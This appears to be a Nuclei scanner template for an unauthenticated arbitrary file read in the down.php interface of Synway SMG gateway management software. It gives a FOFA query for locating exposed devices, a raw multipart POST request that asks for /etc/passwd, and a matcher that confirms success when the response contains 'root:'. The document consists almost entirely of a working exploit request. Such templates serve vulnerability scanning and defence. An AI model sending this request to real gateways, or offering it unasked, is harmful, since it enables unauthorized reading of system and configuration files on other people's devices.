id: Synway-down-File-reading
 
info:
  name: 三汇 SMG 网关管理软件 down.php 任意文件读取
  author: HuanXiong
  severity: high
  description: |-
    fofa: body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")
    三汇SMG网关管理软件down.php 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  reference:
    - 
  tags: File reading
 
 
http:
  - raw:
      - |
        POST /down.php HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Upgrade-Insecure-Requests: 1
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrjG56nHVKDDdMNQK

        ------WebKitFormBoundaryrjG56nHVKDDdMNQK
        Content-Disposition: form-data; name="downfile"

        /etc/passwd
        ------WebKitFormBoundaryrjG56nHVKDDdMNQK
        Content-Disposition: form-data; name="down"

        下载
        ------WebKitFormBoundaryrjG56nHVKDDdMNQK
        Content-Disposition: form-data; name="runinfoupdate"
 
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,'root:')
 